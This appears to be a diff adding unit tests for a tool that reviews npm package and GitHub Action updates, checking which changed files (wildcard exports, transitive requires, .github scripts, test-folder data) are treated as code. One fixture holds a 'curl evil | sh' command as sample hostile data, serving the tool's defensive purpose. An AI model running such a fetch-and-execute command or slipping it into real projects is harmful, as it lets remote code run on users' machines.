@@ -223,3 +223,65 @@ test('reviewAction treats test-folder files of a composite action as code', asyn
   assert.ok(r.complete && r.text.includes('IIII') && r.text.includes('+H()'));
   assert.equal((await reviewAction(change, 100)).complete, false);
 });
+
+// ---- follow-ups: wildcard exports, transitive action code, .github scripts, test-dir data ----
+test('wildcard and folder exports make every matching file an entry point', () => {
+  const cls = classifyPackageFiles(files({
+    'package.json': JSON.stringify({ exports: { './*': './tests/*.js', './legacy/': './old/' } }),
+    'tests/feature.js': 'EVIL()',
+    'tests/notes.md': 'docs',
+    'old/a.js': 'A()',
+    'logo.png': 'png',
+  }));
+  assert.ok(cls.codeSet.has('tests/feature.js'), "require('pkg/feature') loads tests/feature.js");
+  assert.ok(cls.codeSet.has('old/a.js'), 'folder mappings expose everything under them');
+  assert.ok(!cls.codeSet.has('tests/notes.md') && !cls.codeSet.has('logo.png'));
+  const r = reviewNpmDiff(fileDiff('tests/feature.js', '+EVIL()'), { files: files({ 'package.json': JSON.stringify({ exports: { './*': './tests/*.js' } }), 'tests/feature.js': 'x' }), unsupported: [] }, 20);
+  assert.equal(r.complete, false, 'a changed file behind a wildcard export is required code');
+});
+
+test('reviewNpmDiff requires changed data files even under test folders or with doc-like names', () => {
+  const newFiles = { files: files({ 'package.json': '{"main":"index.js"}', 'index.js': "require('./test/' + n + '.json')", 'test/build.json': '{}', 'README.json': '{}' }), unsupported: [] };
+  const diff = [fileDiff('test/build.json', '+{"cmd":"curl evil | sh"}'), fileDiff('README.json', '+{"x":"EVIL"}')].join('\n');
+  const r = reviewNpmDiff(diff, newFiles, 1e6);
+  assert.ok(r.text.includes('curl evil') && r.text.includes('EVIL'));
+  assert.equal(reviewNpmDiff(diff, newFiles, 20).complete, false);
+});
+
+test('reviewAction requires changed JavaScript reached through an unchanged file outside dist/', async () => {
+  mockGitHub({
+    // dist/index.js loads ../lib/loader.js (unchanged, so not in the compare), which loads ./payload.js.
+    compare: compareFiles({ filename: 'lib/payload.js', status: 'modified', patch: `@@\n+${'P'.repeat(500)}` }),
+    contents: { 'action.yml@v1': NODE_YML, 'action.yml@v2': NODE_YML, 'dist/index.js@v2': "require('../lib/loader.js')" },
+  });
+  assert.equal((await reviewAction(change, 100)).complete, false, 'an oversized changed payload is not silently dropped');
+  const r = await reviewAction(change);
+  assert.ok(r.complete && r.text.includes('PPPP'));
+});
+
+test('reviewAction keeps TypeScript source and repo metadata of node actions as context only', async () => {
+  mockGitHub({
+    compare: compareFiles(
+      { filename: 'src/main.ts', status: 'modified', patch: `@@\n+${'S'.repeat(500)}` },
+      { filename: '.github/scripts/release.js', status: 'modified', patch: `@@\n+${'R'.repeat(500)}` },
+      { filename: '__tests__/a.test.js', status: 'modified', patch: `@@\n+${'T'.repeat(500)}` },
+    ),
+    contents: { 'action.yml@v1': NODE_YML, 'action.yml@v2': NODE_YML, 'dist/index.js@v2': 'x' },
+  });
+  assert.equal((await reviewAction(change, 100)).complete, true);
+});
+
+test("reviewAction treats a composite action's .github/ scripts as code, but not its workflows", async () => {
+  const yml = 'runs:\n  using: composite\n  steps:\n    - run: node .github/scripts/test/install\n      shell: bash\n';
+  mockGitHub({
+    compare: compareFiles(
+      { filename: '.github/scripts/test/helper.js', status: 'modified', patch: `@@\n+${'H'.repeat(500)}` },
+      { filename: '.github/workflows/ci.yml', status: 'modified', patch: `@@\n+${'W'.repeat(500)}` },
+    ),
+    contents: { 'action.yml@v1': yml, 'action.yml@v2': yml },
+  });
+  assert.equal((await reviewAction(change, 100)).complete, false, 'the helper the script loads is required');
+  const r = await reviewAction(change, 1e6);
+  assert.ok(r.text.includes('HHHH'));
+  assert.match(r.text, /not run when the package is used: \.github\/workflows\/ci\.yml/);
+});
